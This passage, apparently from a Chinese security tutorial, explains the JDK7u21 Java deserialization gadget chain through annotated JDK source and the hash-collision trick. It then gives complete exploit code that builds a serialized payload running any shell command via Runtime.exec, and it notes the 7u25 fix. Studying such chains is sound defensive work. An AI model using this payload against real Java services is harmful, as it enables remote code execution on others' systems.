<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Templates</span> &#123;</span><br><span class="line"></span><br><span class="line">    Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException;</span><br><span class="line"></span><br><span class="line">    Properties <span class="title function_">getOutputProperties</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此 <code>Templates.class.getDeclaredMethods()</code> 返回的方法中第一个方法只能是 <code>newTransformer</code> 或 <code>getOutputProperties</code>，这两个方法都能触发 <code>TemplatesImpl</code> 的任意字节码加载的利用链。</p>
<p>而 <code>TemplatesImpl.class</code> 返回的第一个方法大概率不能触发 <code>TemplatesImpl</code> 的任意字节码加载的利用链，而是报错导致 <code>equalsImpl</code> 函数提前返回，无法完成利用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 否则走常规反射：调用对方实例的该成员方法取值</span></span><br><span class="line">    hisValue = memberMethod.invoke(o); <span class="comment">// 📌 对参数 o 调用 types 中的所有方法</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    <span class="comment">// 对方方法执行异常 → 视为不相等（保守处理）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// ❌ 直接返回无法调用后续方法完成利用</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    <span class="comment">// 理论上不应发生（前面已 setAccessible），若发生则属于断言级错误</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>而 <code>equalsImpl</code> 方法可以通过 <code>AnnotationInvocationHandler#invoke</code> 方法调用。也就是说如果我们使用 <code>AnnotationInvocationHandler#invoke</code> 代理一个类，然后调用这个类的 <code>equals</code> 方法就可以触发 <code>AnnotationInvocationHandler#equalsImpl</code> 方法调用，且传入的参数是 <code>equals</code> 的参数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 动态代理的统一入口：当代理对象上的任意方法被调用时，都会回调到这里。</span></span><br><span class="line"><span class="comment"> * 这里展示了对 Object/Annotation 标准方法的特殊处理分支——equals。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// 当前被调用的方法名（如 &quot;equals&quot;、&quot;hashCode&quot;、&quot;toString&quot; 等）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="comment">// 方法参数类型列表，用于精确匹配重载签名（避免仅靠方法名造成误判）</span></span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 Object 与 Annotation 的“标准方法”</span></span><br><span class="line">    <span class="comment">// 分支一：equals(Object)</span></span><br><span class="line">    <span class="comment">// 条件：方法名为 &quot;equals&quot;，参数个数为 1，且参数类型正是 Object.class</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;equals&quot;</span>.equals(member) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="comment">// 委托给自定义的 equals 实现（见 equalsImpl），返回 Boolean（自动装箱）</span></span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HashSet</code> 内部实际上是通过 <code>HashMap</code> 来实现的，我们存入 <code>HashSet</code> 中的数据实际上是存入内部成员 <code>private transient HashMap&lt;E,Object&gt; map;</code> 的键中，而对应的值设为一个 <code>Object</code> 类型的对象来占位。因此在 <code>HashSet#readObject</code> 函数中我们会把 <code>HashSet</code> 存储的元素逐个加到 <code>HashMap</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义反序列化逻辑：从 ObjectInputStream 中恢复 HashSet/LinkedHashSet 的内部状态。</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - HashSet 的底层是一个 HashMap，值部分用一个哑元（PRESENT）占位；</span></span><br><span class="line"><span class="comment"> * - LinkedHashSet 则用 LinkedHashMap 以保持插入顺序。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 读取“默认可序列化字段”，把非 transient / 非 static 的成员恢复出来</span></span><br><span class="line">    <span class="comment">//    （例如：HashSet 的一些标志位、负载因子字段等由默认机制处理）</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 按旧版本序列化格式读取底层表的容量与负载因子</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span>   <span class="operator">=</span> s.readInt();   <span class="comment">// 底层表容量</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat(); <span class="comment">// 负载因子</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 根据具体运行时类型选择底层 Map：</span></span><br><span class="line">    <span class="comment">//    - 若 this 实际上是 LinkedHashSet，则使用 LinkedHashMap（保持插入顺序）</span></span><br><span class="line">    <span class="comment">//    - 否则使用普通 HashMap</span></span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet)</span><br><span class="line">            ? <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor)</span><br><span class="line">            : <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 读取元素个数 size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 按序读取每一个元素，并放入到底层 Map 中（值统一使用占位符 PRESENT）</span></span><br><span class="line">    <span class="comment">//    注意：对每个元素调用 s.readObject()，若元素类型自定义了 readObject，</span></span><br><span class="line">    <span class="comment">//    此处会执行其反序列化代码（可能触发用户代码）。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT); <span class="comment">// HashSet 用“键=元素，值=PRESENT”的方式存储</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>HashMap</code> 中会计算哈希值找到对应的桶然后逐个比较去重，最后放到 <code>HashMap</code> 中。这里涉及到了 <code>equals</code> 方法的调用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key); <span class="comment">// 👈 计算要存入的 key 的哈希</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="comment">// 📌 如果与 set 中存在的元素的哈希值相等则会调用 key.equals 与其比较</span></span><br><span class="line">        <span class="comment">// 这里需要让 key 为 AnnotationInvocationHandler</span></span><br><span class="line">        <span class="comment">// 原本的元素的键为 TemplatesImpl</span></span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们：</p>
<ul>
<li>在 <code>HashSet</code> 中放一个 <code>TemplatesImpl</code> 对象再放一个 <code>AnnotationInvocationHandler</code> 代理的对象（ <code>AnnotationInvocationHandler</code> 代理的对象是后加入，这里为了保证顺序可以使用 <code>LinkedHashSet</code> 代替 <code>HashSet</code>）；</li>
<li>并且恰巧这两个对象的<strong>哈希值相等</strong>；</li>
</ul>
<p>那么调用 <code>equals</code> 方法就会触发前面介绍的利用链。</p>
<p>所以现在的问题是如何构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得其哈希值与 <code>TemplatesImpl</code> 对象相等。</p>
<p>由于 <code>TemplatesImpl</code> 没有显式实现 <code>hashCode()</code> 方法，因此它将继承自 <code>java.lang.Object</code> 类中的默认实现。在这种情况下，调用 <code>hashCode()</code> 方法返回的是该对象的内存地址经过哈希计算后得到的一个整数值。也就是说这个哈希值我们不可控制。</p>
<p>但是我们可以想办法构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得它的哈希值总是与 <code>TemplatesImpl</code> 对象的哈希值相等。 </p>
<p><code>AnnotationInvocationHandler</code> <strong>代理的对象</strong>的 <code>hashCode</code> 方法实际上调用的是 <code>AnnotationInvocationHandler#invoke</code> 进而会调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code>。</p>
<p>这个方法会遍历 <code>memberValues</code> 这个 <code>Map</code> 中的每个 <code>key</code> 和 <code>value</code>，计算每个 <code>(127 * key.hashCode()) ^ value.hashCode()</code> 并求和。因此我们只要让 <code>value</code> 为<strong>同一个</strong> <code>TemplatesImpl</code> 且 <code>key</code> 的哈希值为 0 即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">        result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">            memberValueHashCode(e.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Computes hashCode of a member value (in &quot;dynamic proxy return form&quot;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">memberValueHashCode</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    Class&lt;?&gt; type = value.getClass();</span><br><span class="line">    <span class="keyword">if</span> (!type.isArray())    <span class="comment">// primitive, string, class, enum const,</span></span><br><span class="line">                            <span class="comment">// or annotation</span></span><br><span class="line">        <span class="keyword">return</span> value.hashCode();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>网上通常的做法是枚举十六进制数字对应的字符串，最终得到 <code>f5a5a608</code> 这个字符串。但实际上根据字符串的哈希计算方式很容易就构造出 <code>\0</code> 这一字符串。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用代码-1"><a href="#利用代码-1" class="headerlink" title="利用代码"></a>利用代码</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getEvilClass(cmd)&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// Templates.class =&gt; AnnotationInvocationHandler#type =&gt; 要触发的方法</span></span><br><span class="line">        <span class="comment">// map =&gt; AnnotationInvocationHandler#memberValues =&gt; 确保哈希一致</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 随便代理一个接口，比如 Serializable</span></span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">proxy</span> <span class="operator">=</span> (Serializable) Proxy.newProxyInstance(Serializable.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Serializable.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        System.out.println(proxy.hashCode());</span><br><span class="line">        System.out.println(templates.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">clinit</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        clinit.setBody(<span class="string">&quot;&#123; java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;); &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置父类为 AbstractTranslet</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(cmd));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>由于 JDK 版本较低，生成恶意类的 <code>javassist</code> 库需要选择一个低版本的。，否则会因为 JAR 包中类的 Java 版本过高报错。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.18.2-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h3><p><strong>JDK 7u25（1.7.0_25）</strong> 引入的<a class="link"   target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350" >加固补丁<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（OpenJDK 变更集 <strong>0ca6cbe3f350</strong>，问题编号 <em>8001309 “Better handling of annotation interfaces”</em>）：从 7u25 起，<code>AnnotationInvocationHandler.readObject</code> 在遇到非注解类型时会抛出 <code>InvalidObjectException</code>。</p>
